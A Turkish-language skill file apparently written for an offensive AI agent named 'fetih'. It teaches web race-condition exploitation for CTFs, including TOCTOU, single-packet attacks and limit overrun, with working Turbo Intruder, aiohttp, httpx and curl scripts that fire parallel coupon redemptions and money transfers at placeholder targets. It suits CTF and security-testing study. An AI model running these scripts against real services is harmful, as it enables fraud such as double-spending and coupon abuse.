---
name: race-conditions
description: Web race condition exploitation — TOCTOU, single-packet attack, limit overrun, parallel race testing
tags: [ctf, web, race-condition, toctou, parallel-request, turbo-intruder, aiohttp, single-packet]
triggers:
  - "race condition"
  - "TOCTOU"
  - "time of check time of use"
  - "tek seferlik kupon"
  - "limit overrun"
  - "double spending"
  - "concurrent request"
  - "transfer money"
  - "vote once"
  - "register limit"
  - "single packet attack"
  - "turbo intruder"
  - "parallel POST"
  - "rate limit bypass"
difficulty: medium
category: web
solved_challenges:
  - "DiceCTF 2024 - dicedicegoose (race condition variant)"
  - "PortSwigger Race Condition labs"
  - "Real World CTF 2022 - VShop (limit overrun)"
  - "HackTheBox - Multiple race condition challenges"
  - "TJCTF 2023 - hidden (parallel auth)"
related_skills:
  - sqli-exploitation
  - jwt-web-bypass
  - prototype-pollution
adapted_for: fetih
---

# Race Condition Exploitation — TOCTOU, Single-Packet ve Limit Overrun

Race condition: iki işlem aynı kaynağı eşzamanlı işlerse, "kontrol" ve "kullanım" arasındaki boşlukta tutarsızlık oluşur. Web CTF'te en yaygın senaryolar: bir kupon birden çok kullanma, limit aşma, parallel auth bypass.

---

## Ne Zaman Kullan

İpuçları:
- "Bir kez kullanılabilir" (kupon, oy, ödül)
- "Limit X" (5 kez/gün, 1 transfer/saat)
- Kayıt formu: aynı email tekrar denemede 200ms farkla 2 kayıt oluşturur
- Para transferi: bakiyenden çoğunu transfer et
- File operation: check-then-act paterni

### Pratik Örnekler
1. Kullanıcının `balance = 100`. `transfer($100)` 100 kez paralel → 100 kez geçer = 10000 transfer
2. Tek-kullanımlık kupon `coupon=DISCOUNT50` paralel uygulanırsa N kez geçer
3. Register endpoint: aynı email N kez paralel → N hesap oluşur

---

## Tip 1 — Classic TOCTOU

### Patern
```python
# Pseudocode (savunmasız)
def transfer(from_user, to_user, amount):
    if from_user.balance >= amount:        # CHECK
        # ... 100ms işlem ...
        from_user.balance -= amount         # USE
        to_user.balance += amount
        save()
```

Saldırı: aynı `transfer($100)` request'ini 50 paralel gönder. 50 thread aynı anda `balance >= 100` kontrolünü geçer → her biri `-= 100` yapar.

---

## Tip 2 — Single-Packet Attack (PortSwigger 2023)

James Kettle'ın geliştirdiği yeni teknik: HTTP/2'de 20-30 request'i tek TCP packet içine sığdır → backend'e nano-saniye farkla ulaşır → race window'u maksimize.

```python
# Single-packet attack with curl
# HTTP/2 multiplex 30 request in one packet
```

Burp Suite Turbo Intruder (gold standard):
```python
# Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           engine=Engine.BURP2)

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')   # tüm requestleri aynı anda gönder

def handleResponse(req, interesting):
    table.add(req)
```

---

## Tip 3 — Limit Overrun (Parallel Race)

aiohttp ile paralel POST:

```python
# parallel_race.py
import asyncio
import aiohttp

URL = 'https://target.tld/api/coupon/redeem'
COOKIE = 'session=abc123'
COUPON = 'WELCOME10'

async def redeem(session):
    async with session.post(URL,
                            data={'code': COUPON},
                            cookies={'session': 'abc123'}) as r:
        return r.status, await r.text()

async def main():
    async with aiohttp.ClientSession() as session:
        # 50 paralel istek
        tasks = [redeem(session) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        for i, (status, body) in enumerate(results):
            if 'success' in body.lower():
                print(f'[{i}] SUCCESS')

asyncio.run(main())
```

### Önemli: Connection Pool
aiohttp default 100 connection. Hepsi farklı TCP olabilir → tetikleme zamanı milisaniyeler farklı. Single-packet için daha sıkı.

```python
# Tek connection, çoklu pipeline
connector = aiohttp.TCPConnector(limit=1, force_close=False)
session = aiohttp.ClientSession(connector=connector)
# HTTP/2 multiplex (aiohttp HTTP/2 limited support, httpx daha iyi)
```

---

## Tip 4 — Httpx + HTTP/2 Multiplex

```python
# httpx_race.py
import httpx
import asyncio

URL = 'https://target.tld/api/transfer'

async def main():
    async with httpx.AsyncClient(http2=True) as client:
        # HTTP/2 stream multiplexing
        tasks = [
            client.post(URL, json={'amount': 100, 'to': 'attacker'},
                        headers={'Cookie': 'sess=abc'})
            for _ in range(20)
        ]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status_code, r.text[:80])

asyncio.run(main())
```

---

## Tip 5 — Curl Parallel (CLI hızlı test)

```bash
# 20 paralel coupon redeem
for i in $(seq 1 20); do
    curl -X POST https://target.tld/api/coupon \
        -H "Cookie: session=abc" \
        -d "code=DISCOUNT50" &
done
wait
```

---

## Burp Turbo Intruder Detayı

### "race-single-packet" Engine (HTTP/2)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          engine=Engine.BURP2,
                          concurrentConnections=1,
                          requestsPerConnection=30,
                          pipeline=False)

    # Aynı request'i 30 kez kuyrukla
    for _ in range(30):
        engine.queue(target.req)

    # Aynı paketle gönderim ipucu:
    # Burp 2023+ HTTP/2 last-byte sync ile bunu otomatik yapar
```

---

## Tip 6 — Idempotency Key Bypass

Sunucu `Idempotency-Key` header'ı kontrol ediyor ama eşzamanlı request'lerde aynı anda iki request varsa key veritabanına yazılamadan ikisi de geçer:

```python
# Saldırı: aynı idempotency key ile 10 paralel
headers = {
    'Idempotency-Key': 'same_uuid_here',
    'Cookie': 'sess=abc'
}
# Eğer veritabanı INSERT ... ON CONFLICT DO NOTHING ise race vardır
```

---

## Tip 7 — Authorization Race

Yeni endpoint ya `is_admin` flag set olduktan sonra denenir, ama:

```python
# Adım 1: register
# Adım 2: admin promotion (manual, slow)
# Adım 3: admin-only endpoint

# Race: adım 2 işlem sırasında adım 3 paralel atılır
# Bazı backend'ler permission cache'i 1-2 saniye gecikmeli güncellenir
```

---

## Tip 8 — File Race (Atomic Move/Rename)

Race condition file operation'da:

```python
# Sunucu:
#   1. CHECK: filename.endswith('.txt')
#   2. SAVE: file.save(filename)
#   3. SCAN: virus_scan(filename)
#   4. RENAME: rename to safe_name

# Saldırı:
#   filename = "shell.php"
#   Adım 1'i ".txt" ile geç, sonra hızlıca "shell.php"e rename
#   (Bu kategori daha çok local race ama web upload'da da görülür)
```

---

## Detection Stratejileri

### Database ID Sequence
Race başarılı ise `auto_increment ID` sıralı atlamalar gösterir:
```
ID 100, 101, 102 → race öncesi normal
ID 103, 105, 107, 109 → race olmuş (104, 106, 108 başka transaction'lar arasında)
```

### Response Time Anomalies
Tek request 100ms; 30 paralel request 150ms → race tetiklendi (paralel işlem var).

### Database Constraint Violations
```
SQLSTATE[23000]: Integrity constraint violation
```
Bu mesaj race'in çalıştığını ama DB constraint ile son anda durdurulduğunu gösterir.

---

## Tuzaklar

1. **Sadece "kontrol" yok, "kilit" var** — modern frameworkler `SELECT ... FOR UPDATE` veya distributed lock kullanır. Bu durumda race çalışmaz.
2. **Single-packet ihtiyacı** — Burp Turbo, aiohttp, curl parallel zamanlama farklı. Mikrosaniye hassasiyeti için Burp 2023+ ideal.
3. **Network jitter** — 30 paralel request internet'te 50ms scatter olur. LAN'da test etmek farklı sonuç verebilir.
4. **Idempotency middleware** — bazı framework'ler (Stripe SDK) idempotency key'i otomatik enforce eder.
5. **`UNIQUE` constraint başka sorunlar yaratır** — race tetiklenir ama DB rollback'le.
6. **Connection pool sınırı** — aiohttp default 100, Python default 10. Çoğaltmak gerekir.
7. **Backend slowness** — race window 100ms'ten uzunsa race çoğu kez başarılı, ama hızlı backend'lerde mikrosaniye window'u.

---

## Cross-Skill Pivot

```
Bir kez kullanılabilir/limit var → race condition test
                                ├── Tek packet ihtiyacı → Turbo Intruder (Burp)
                                ├── HTTP/2 → httpx multiplex
                                ├── HTTP/1.1 → aiohttp parallel
                                ├── Auth race → JWT + race kombi
                                └── Limit hala devam → distributed lock var, başka açık ara
```

---

## Tools

```bash
# Burp Suite + Turbo Intruder (Bambdas)
# https://github.com/PortSwigger/turbo-intruder

# racepwn — Python
pip install racepwn

# httpx, aiohttp
pip install httpx[http2] aiohttp

# wrk for HTTP load (high concurrency)
sudo apt install wrk
wrk -t 20 -c 100 -d 5s --latency https://target.tld/race
```

---

## Pratik Örnek — Coupon Redeem Race

```python
# coupon_race_exploit.py
import asyncio
import aiohttp

TARGET = 'https://target.tld'
COOKIE = 'session=abc123'
COUPON_CODE = 'WELCOME50'

async def redeem(session, i):
    async with session.post(f'{TARGET}/api/coupon/redeem',
                            json={'code': COUPON_CODE},
                            headers={'Cookie': COOKIE}) as r:
        body = await r.text()
        return i, r.status, body

async def main():
    # Tek TCP üzerinde HTTP/2 multiplex
    timeout = aiohttp.ClientTimeout(total=30)
    connector = aiohttp.TCPConnector(limit=1, force_close=False)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = [redeem(session, i) for i in range(30)]
        # Tüm task'ları aynı anda başlat
        results = await asyncio.gather(*tasks)

        success = sum(1 for _, _, body in results if 'redeemed' in body)
        print(f'{success}/30 başarılı kullanım')

        # Bakiyeyi kontrol et
        async with session.get(f'{TARGET}/api/balance',
                              headers={'Cookie': COOKIE}) as r:
            print('Balance:', await r.text())

asyncio.run(main())
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 5a56ed06dcca427a
-->

